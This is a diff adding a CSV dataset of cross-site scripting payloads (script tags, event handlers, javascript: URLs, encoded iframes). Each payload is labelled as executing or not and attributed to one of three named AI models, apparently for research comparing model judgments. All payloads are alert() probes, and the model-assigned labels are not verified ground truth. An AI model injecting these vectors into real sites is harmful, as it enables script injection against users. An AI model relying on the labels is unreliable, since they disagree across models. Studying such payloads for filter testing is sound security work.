@@ -1,0 +1,301 @@
+﻿Payloads,label,Model
+<script>alert('XSS1')</script>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<img src=x onerror=alert('XSS2')>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<script>alert('XSS3')</script>,Malicious-unsafe,ChatGPT 5.2 Thinking
+"<a href='javascript:alert(\""XSS4\"")'>click</a>",Malicious-unsafe,ChatGPT 5.2 Thinking
+<input autofocus onfocus=alert('XSS5')>,Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe src='javascript:alert(\""XSS6\"")'></iframe>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+<svg onload=alert('XSS7')>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<body onload=alert('XSS8')>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<div onclick=alert('XSS9')>Click me</div>,Malicious-unsafe,ChatGPT 5.2 Thinking
+"<meta http-equiv='refresh' content='0;url=javascript:alert(\""XSS10\"")'>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<style>body{background:url(\""javascript:alert('XSS11')\"")}</style>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+%3Cscript%3Ealert('XSS12')%3C/script%3E,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+<span onmouseover=alert('XSS13')>Hover me</span>,Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe srcdoc=\""<script>alert('XSS14')</script>\""></iframe>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<object data='javascript:alert(\""XSS15\"")'></object>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+<form onsubmit=alert('XSS16')><input type='submit'></form>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<video src=x onerror=alert('XSS17')></video>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<audio src=x onerror=alert('XSS18')></audio>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<textarea onfocus=alert('XSS19')>Focus me</textarea>,Malicious-unsafe,ChatGPT 5.2 Thinking
+"<math href='javascript:alert(\""XSS20\"")'>X</math>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<base href=\""javascript:alert('XSS21');//\"">",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<a href='#' onclick='alert(\""XSS22\"")'>Click me</a>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<meta http-equiv='refresh' content='0;url=javascript:alert(\""XSS23\"")'>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<button onclick='alert(\""XSS24\"")'>Click</button>",Malicious-unsafe,ChatGPT 5.2 Thinking
+<form onreset=alert('XSS25')><input type='reset'></form>,Malicious-unsafe,ChatGPT 5.2 Thinking
+<marquee onstart=alert('XSS26')>Scrolling text</marquee>,Malicious-unsafe,ChatGPT 5.2 Thinking
+"<embed src='javascript:alert(\""XSS27\"")'>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<bgsound src='javascript:alert(\""XSS28\"")'>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+<xml onload=alert('XSS29')>,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<iframe src='about:blank' onload='alert(\""XSS30\"")'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<base href=\""javascript:alert('XSS32');//\"">",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<div onpointerover='alert(\""XSS34\"")'>Hover me</div>",Malicious-unsafe,ChatGPT 5.2 Thinking
+<script>alert(XSS35)</script>,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<div style='animation-name:x' onanimationstart='alert(\""XSS37\"")'>Test</div>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<input oninput='alert(\""XSS38\"")'>",Malicious-unsafe,ChatGPT 5.2 Thinking
+<script>eval(alert('XSS39'))</script>,Malicious-unsafe,ChatGPT 5.2 Thinking
+"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<span onpointerdown='alert(\""XSS41\"")'>Click me</span>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<math href='javascript:alert(\""XSS42\"")'>X</math>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<iframe sandbox='allow-scripts' srcdoc='<script>alert(\""XSS43\"")</script>'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<video oncanplay='alert(\""XSS44\"")'></video>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(\""XSS45\"")'>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg><set attributeName='onbegin' to='alert(\""XSS46\"")' begin='0s' dur='1s'/></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<script>setTimeout('alert(\""XSS47\"")',0)</script>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<details ontoggle='alert(\""XSS48\"")'><summary>Click me</summary></details>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<input formaction='javascript:alert(\""XSS49\"")' type='submit'>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg><animateMotion onbegin='alert(\""XSS50\"")' dur='1s' repeatCount='1'/></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<script>setInterval(function(){alert('XSS51')},1000)</script>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe srcdoc='<script>alert(\""XSS52\"")</script>' onload='alert(\""XSS52\"")'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onload='alert(\""XSS53\"")'><script>alert('XSS53')</script></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe src='javascript:alert(\""XSS54\"")'></iframe>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onload='setTimeout(function(){alert(\""XSS56\"")},0)'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe srcdoc=\""&lt;script&gt;alert('XSS57')&lt;/script&gt;\""></iframe>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg><animateTransform attributeName='onbegin' to='alert(\""XSS58\"")' begin='0s' dur='1s'/></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<script>Function('alert(\""XSS59\"")')()</script>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe onload='alert(\""XSS60\"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<details ontoggle='alert(\""XSS62\"")'><summary>Click me</summary></details>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<math href='javascript:alert(\""XSS63\"")'>X</math>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<audio src='x' onerror='alert(\""XSS64\"")'></audio>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe srcdoc='<script>alert(\""XSS65\"")</script>' onload='alert(\""XSS65\"")'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg><animateMotion onbegin='alert(\""XSS66\"")' dur='1s' repeatCount='1'/></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<input oninvalid='alert(\""XSS67\"")' required>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe allow='scripts' srcdoc='<script>alert(\""XSS68\"")</script>'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg tabindex='1' onfocusin='alert(\""XSS69\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<video onpause='alert(\""XSS70\"")'></video>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onmouseenter='alert(\""XSS71\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<form oninput='alert(\""XSS72\"")'><input></form>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onwheel='alert(\""XSS73\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<iframe allowfullscreen onload='alert(\""XSS74\"")'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onanimationend='alert(\""XSS75\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<audio onplay='alert(\""XSS76\"")'></audio>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onscroll='alert(\""XSS77\"")' style='overflow:auto;height:10px;'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<iframe seamless onload='alert(\""XSS78\"")'></iframe>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg oncut='alert(\""XSS79\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg oncopy='alert(\""XSS80\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onpaste='alert(\""XSS81\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onreset='alert(\""XSS82\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onsearch='alert(\""XSS83\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onselect='alert(\""XSS84\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onshow='alert(\""XSS85\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg ontoggle='alert(\""XSS86\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg ontransitionend='alert(\""XSS87\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onunload='alert(\""XSS88\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onvolumechange='alert(\""XSS89\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onwaiting='alert(\""XSS90\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onwheel='alert(\""XSS91\"")' style='animation:spin 1s linear infinite'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onpointercancel='alert(\""XSS92\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onpointerout='alert(\""XSS93\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onpointerover='alert(\""XSS94\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onpointerup='alert(\""XSS95\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg onselectstart='alert(\""XSS96\"")'></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+"<svg tabindex='0' onshow='alert(\""XSS97\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onstalled='alert(\""XSS98\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onsubmit='alert(\""XSS99\"")'></svg>",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"<svg onunload='alert(\""XSS100\"")'><script>alert('XSS100')</script></svg>",Malicious-unsafe,ChatGPT 5.2 Thinking
+<script>alert('XSS1')</script>,Malicious-unsafe,Gemini 3 pro 
+<img src=x onerror=alert('XSS2')>,Malicious-unsafe,Gemini 3 pro 
+<script>alert('XSS3')</script>,Malicious-unsafe,Gemini 3 pro 
+"<a href='javascript:alert(\""XSS4\"")'>click</a>",Malicious-unsafe,Gemini 3 pro 
+<input autofocus onfocus=alert('XSS5')>,Malicious-unsafe,Gemini 3 pro 
+"<iframe src='javascript:alert(\""XSS6\"")'></iframe>",Malicious-unsafe,Gemini 3 pro 
+<svg onload=alert('XSS7')>,Malicious-unsafe,Gemini 3 pro 
+<body onload=alert('XSS8')>,Malicious-unsafe,Gemini 3 pro 
+<div onclick=alert('XSS9')>Click me</div>,Malicious-unsafe,Gemini 3 pro 
+"<meta http-equiv='refresh' content='0;url=javascript:alert(\""XSS10\"")'>",Malicious-unsafe,Gemini 3 pro 
+"<style>body{background:url(\""javascript:alert('XSS11')\"")}</style>",MaliciousIntended-but-safe,Gemini 3 pro 
+%3Cscript%3Ealert('XSS12')%3C/script%3E,MaliciousIntended-but-safe,Gemini 3 pro 
+<span onmouseover=alert('XSS13')>Hover me</span>,Malicious-unsafe,Gemini 3 pro 
+"<iframe srcdoc=\""<script>alert('XSS14')</script>\""></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<object data='javascript:alert(\""XSS15\"")'></object>",Malicious-unsafe,Gemini 3 pro 
+<form onsubmit=alert('XSS16')><input type='submit'></form>,Malicious-unsafe,Gemini 3 pro 
+<video src=x onerror=alert('XSS17')></video>,Malicious-unsafe,Gemini 3 pro 
+<audio src=x onerror=alert('XSS18')></audio>,Malicious-unsafe,Gemini 3 pro 
+<textarea onfocus=alert('XSS19')>Focus me</textarea>,Malicious-unsafe,Gemini 3 pro 
+"<math href='javascript:alert(\""XSS20\"")'>X</math>",Malicious-unsafe,Gemini 3 pro 
+"<base href=\""javascript:alert('XSS21');//\"">",MaliciousIntended-but-safe,Gemini 3 pro 
+"<a href='#' onclick='alert(\""XSS22\"")'>Click me</a>",Malicious-unsafe,Gemini 3 pro 
+"<meta http-equiv='refresh' content='0;url=javascript:alert(\""XSS23\"")'>",Malicious-unsafe,Gemini 3 pro 
+"<button onclick='alert(\""XSS24\"")'>Click</button>",Malicious-unsafe,Gemini 3 pro 
+<form onreset=alert('XSS25')><input type='reset'></form>,Malicious-unsafe,Gemini 3 pro 
+<marquee onstart=alert('XSS26')>Scrolling text</marquee>,Malicious-unsafe,Gemini 3 pro 
+"<embed src='javascript:alert(\""XSS27\"")'>",Malicious-unsafe,Gemini 3 pro 
+"<bgsound src='javascript:alert(\""XSS28\"")'>",MaliciousIntended-but-safe,Gemini 3 pro 
+<xml onload=alert('XSS29')>,MaliciousIntended-but-safe,Gemini 3 pro 
+"<iframe src='about:blank' onload='alert(\""XSS30\"")'></iframe>",Malicious-unsafe,Gemini 3 pro 
+<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,MaliciousIntended-but-safe,Gemini 3 pro 
+"<base href=\""javascript:alert('XSS32');//\"">",MaliciousIntended-but-safe,Gemini 3 pro 
+<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,MaliciousIntended-but-safe,Gemini 3 pro 
+"<div onpointerover='alert(\""XSS34\"")'>Hover me</div>",Malicious-unsafe,Gemini 3 pro 
+<script>alert(XSS35)</script>,MaliciousIntended-but-safe,Gemini 3 pro 
+<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,Malicious-unsafe,Gemini 3 pro 
+"<div style='animation-name:x' onanimationstart='alert(\""XSS37\"")'>Test</div>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<input oninput='alert(\""XSS38\"")'>",Malicious-unsafe,Gemini 3 pro 
+<script>eval(alert('XSS39'))</script>,Malicious-unsafe,Gemini 3 pro 
+"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",Malicious-unsafe,Gemini 3 pro 
+"<span onpointerdown='alert(\""XSS41\"")'>Click me</span>",Malicious-unsafe,Gemini 3 pro 
+"<math href='javascript:alert(\""XSS42\"")'>X</math>",Malicious-unsafe,Gemini 3 pro 
+"<iframe sandbox='allow-scripts' srcdoc='<script>alert(\""XSS43\"")</script>'></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<video oncanplay='alert(\""XSS44\"")'></video>",Malicious-unsafe,Gemini 3 pro 
+"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(\""XSS45\"")'>",Malicious-unsafe,Gemini 3 pro 
+"<svg><set attributeName='onbegin' to='alert(\""XSS46\"")' begin='0s' dur='1s'/></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<script>setTimeout('alert(\""XSS47\"")',0)</script>",Malicious-unsafe,Gemini 3 pro 
+"<details ontoggle='alert(\""XSS48\"")'><summary>Click me</summary></details>",Malicious-unsafe,Gemini 3 pro 
+"<input formaction='javascript:alert(\""XSS49\"")' type='submit'>",Malicious-unsafe,Gemini 3 pro 
+"<svg><animateMotion onbegin='alert(\""XSS50\"")' dur='1s' repeatCount='1'/></svg>",Malicious-unsafe,Gemini 3 pro 
+"<script>setInterval(function(){alert('XSS51')},1000)</script>",Malicious-unsafe,Gemini 3 pro 
+"<iframe srcdoc='<script>alert(\""XSS52\"")</script>' onload='alert(\""XSS52\"")'></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<svg onload='alert(\""XSS53\"")'><script>alert('XSS53')</script></svg>",Malicious-unsafe,Gemini 3 pro 
+"<iframe src='javascript:alert(\""XSS54\"")'></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",Malicious-unsafe,Gemini 3 pro 
+"<svg onload='setTimeout(function(){alert(\""XSS56\"")},0)'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<iframe srcdoc=\""&lt;script&gt;alert('XSS57')&lt;/script&gt;\""></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<svg><animateTransform attributeName='onbegin' to='alert(\""XSS58\"")' begin='0s' dur='1s'/></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<script>Function('alert(\""XSS59\"")')()</script>",Malicious-unsafe,Gemini 3 pro 
+"<iframe onload='alert(\""XSS60\"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",Malicious-unsafe,Gemini 3 pro 
+<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,MaliciousIntended-but-safe,Gemini 3 pro 
+"<details ontoggle='alert(\""XSS62\"")'><summary>Click me</summary></details>",Malicious-unsafe,Gemini 3 pro 
+"<math href='javascript:alert(\""XSS63\"")'>X</math>",Malicious-unsafe,Gemini 3 pro 
+"<audio src='x' onerror='alert(\""XSS64\"")'></audio>",Malicious-unsafe,Gemini 3 pro 
+"<iframe srcdoc='<script>alert(\""XSS65\"")</script>' onload='alert(\""XSS65\"")'></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<svg><animateMotion onbegin='alert(\""XSS66\"")' dur='1s' repeatCount='1'/></svg>",Malicious-unsafe,Gemini 3 pro 
+"<input oninvalid='alert(\""XSS67\"")' required>",Malicious-unsafe,Gemini 3 pro 
+"<iframe allow='scripts' srcdoc='<script>alert(\""XSS68\"")</script>'></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<svg tabindex='1' onfocusin='alert(\""XSS69\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<video onpause='alert(\""XSS70\"")'></video>",Malicious-unsafe,Gemini 3 pro 
+"<svg onmouseenter='alert(\""XSS71\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<form oninput='alert(\""XSS72\"")'><input></form>",Malicious-unsafe,Gemini 3 pro 
+"<svg onwheel='alert(\""XSS73\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<iframe allowfullscreen onload='alert(\""XSS74\"")'></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<svg onanimationend='alert(\""XSS75\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<audio onplay='alert(\""XSS76\"")'></audio>",Malicious-unsafe,Gemini 3 pro 
+"<svg onscroll='alert(\""XSS77\"")' style='overflow:auto;height:10px;'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<iframe seamless onload='alert(\""XSS78\"")'></iframe>",Malicious-unsafe,Gemini 3 pro 
+"<svg oncut='alert(\""XSS79\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg oncopy='alert(\""XSS80\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg onpaste='alert(\""XSS81\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg onreset='alert(\""XSS82\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onsearch='alert(\""XSS83\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onselect='alert(\""XSS84\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onshow='alert(\""XSS85\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg ontoggle='alert(\""XSS86\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg ontransitionend='alert(\""XSS87\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onunload='alert(\""XSS88\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onvolumechange='alert(\""XSS89\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onwaiting='alert(\""XSS90\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onwheel='alert(\""XSS91\"")' style='animation:spin 1s linear infinite'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg onpointercancel='alert(\""XSS92\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg onpointerout='alert(\""XSS93\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg onpointerover='alert(\""XSS94\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg onpointerup='alert(\""XSS95\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg onselectstart='alert(\""XSS96\"")'></svg>",Malicious-unsafe,Gemini 3 pro 
+"<svg tabindex='0' onshow='alert(\""XSS97\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onstalled='alert(\""XSS98\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onsubmit='alert(\""XSS99\"")'></svg>",MaliciousIntended-but-safe,Gemini 3 pro 
+"<svg onunload='alert(\""XSS100\"")'><script>alert('XSS100')</script></svg>",Malicious-unsafe,Gemini 3 pro 
+<script>alert('XSS1')</script>,Malicious-unsafe,Claude Sonnet 4.5
+<img src=x onerror=alert('XSS2')>,Malicious-unsafe,Claude Sonnet 4.5
+<script>alert('XSS3')</script>,Malicious-unsafe,Claude Sonnet 4.5
+"<a href='javascript:alert(\""XSS4\"")'>click</a>",Malicious-unsafe,Claude Sonnet 4.5
+<input autofocus onfocus=alert('XSS5')>,Malicious-unsafe,Claude Sonnet 4.5
+"<iframe src='javascript:alert(\""XSS6\"")'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+<svg onload=alert('XSS7')>,Malicious-unsafe,Claude Sonnet 4.5
+<body onload=alert('XSS8')>,Malicious-unsafe,Claude Sonnet 4.5
+<div onclick=alert('XSS9')>Click me</div>,Malicious-unsafe,Claude Sonnet 4.5
+"<meta http-equiv='refresh' content='0;url=javascript:alert(\""XSS10\"")'>",Malicious-unsafe,Claude Sonnet 4.5
+"<style>body{background:url(\""javascript:alert('XSS11')\"")}</style>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+%3Cscript%3Ealert('XSS12')%3C/script%3E,MaliciousIntended-but-safe,Claude Sonnet 4.5
+<span onmouseover=alert('XSS13')>Hover me</span>,Malicious-unsafe,Claude Sonnet 4.5
+"<iframe srcdoc=\""<script>alert('XSS14')</script>\""></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<object data='javascript:alert(\""XSS15\"")'></object>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+<form onsubmit=alert('XSS16')><input type='submit'></form>,Malicious-unsafe,Claude Sonnet 4.5
+<video src=x onerror=alert('XSS17')></video>,Malicious-unsafe,Claude Sonnet 4.5
+<audio src=x onerror=alert('XSS18')></audio>,Malicious-unsafe,Claude Sonnet 4.5
+<textarea onfocus=alert('XSS19')>Focus me</textarea>,Malicious-unsafe,Claude Sonnet 4.5
+"<math href='javascript:alert(\""XSS20\"")'>X</math>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<base href=\""javascript:alert('XSS21');//\"">",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<a href='#' onclick='alert(\""XSS22\"")'>Click me</a>",Malicious-unsafe,Claude Sonnet 4.5
+"<meta http-equiv='refresh' content='0;url=javascript:alert(\""XSS23\"")'>",Malicious-unsafe,Claude Sonnet 4.5
+"<button onclick='alert(\""XSS24\"")'>Click</button>",Malicious-unsafe,Claude Sonnet 4.5
+<form onreset=alert('XSS25')><input type='reset'></form>,Malicious-unsafe,Claude Sonnet 4.5
+<marquee onstart=alert('XSS26')>Scrolling text</marquee>,Malicious-unsafe,Claude Sonnet 4.5
+"<embed src='javascript:alert(\""XSS27\"")'>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<bgsound src='javascript:alert(\""XSS28\"")'>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+<xml onload=alert('XSS29')>,MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<iframe src='about:blank' onload='alert(\""XSS30\"")'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<base href=\""javascript:alert('XSS32');//\"">",MaliciousIntended-but-safe,Claude Sonnet 4.5
+<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,Malicious-unsafe,Claude Sonnet 4.5
+"<div onpointerover='alert(\""XSS34\"")'>Hover me</div>",Malicious-unsafe,Claude Sonnet 4.5
+<script>alert(XSS35)</script>,MaliciousIntended-but-safe,Claude Sonnet 4.5
+<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,Malicious-unsafe,Claude Sonnet 4.5
+"<div style='animation-name:x' onanimationstart='alert(\""XSS37\"")'>Test</div>",Malicious-unsafe,Claude Sonnet 4.5
+"<input oninput='alert(\""XSS38\"")'>",Malicious-unsafe,Claude Sonnet 4.5
+<script>eval(alert('XSS39'))</script>,MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",Malicious-unsafe,Claude Sonnet 4.5
+"<span onpointerdown='alert(\""XSS41\"")'>Click me</span>",Malicious-unsafe,Claude Sonnet 4.5
+"<math href='javascript:alert(\""XSS42\"")'>X</math>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<iframe sandbox='allow-scripts' srcdoc='<script>alert(\""XSS43\"")</script>'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<video oncanplay='alert(\""XSS44\"")'></video>",Malicious-unsafe,Claude Sonnet 4.5
+"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(\""XSS45\"")'>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg><set attributeName='onbegin' to='alert(\""XSS46\"")' begin='0s' dur='1s'/></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<script>setTimeout('alert(\""XSS47\"")',0)</script>",Malicious-unsafe,Claude Sonnet 4.5
+"<details ontoggle='alert(\""XSS48\"")'><summary>Click me</summary></details>",Malicious-unsafe,Claude Sonnet 4.5
+"<input formaction='javascript:alert(\""XSS49\"")' type='submit'>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg><animateMotion onbegin='alert(\""XSS50\"")' dur='1s' repeatCount='1'/></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<script>setInterval(function(){alert('XSS51')},1000)</script>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe srcdoc='<script>alert(\""XSS52\"")</script>' onload='alert(\""XSS52\"")'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onload='alert(\""XSS53\"")'><script>alert('XSS53')</script></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe src='javascript:alert(\""XSS54\"")'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
+"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",Malicious-unsafe,Claude Sonnet 4.5
+"<svg onload='setTimeout(function(){alert(\""XSS56\"")},0)'></svg>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe srcdoc=\""&lt;script&gt;alert('XSS57')&lt;/script&gt;\""></iframe>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<svg><animateTransform attributeName='onbegin' to='alert(\""XSS58\"")' begin='0s' dur='1s'/></svg>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"<script>Function('alert(\""XSS59\"")')()</script>",Malicious-unsafe,Claude Sonnet 4.5
+"<iframe onload='alert(\""XSS60\"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",Malicious-unsafe,Claude Sonnet 4.5
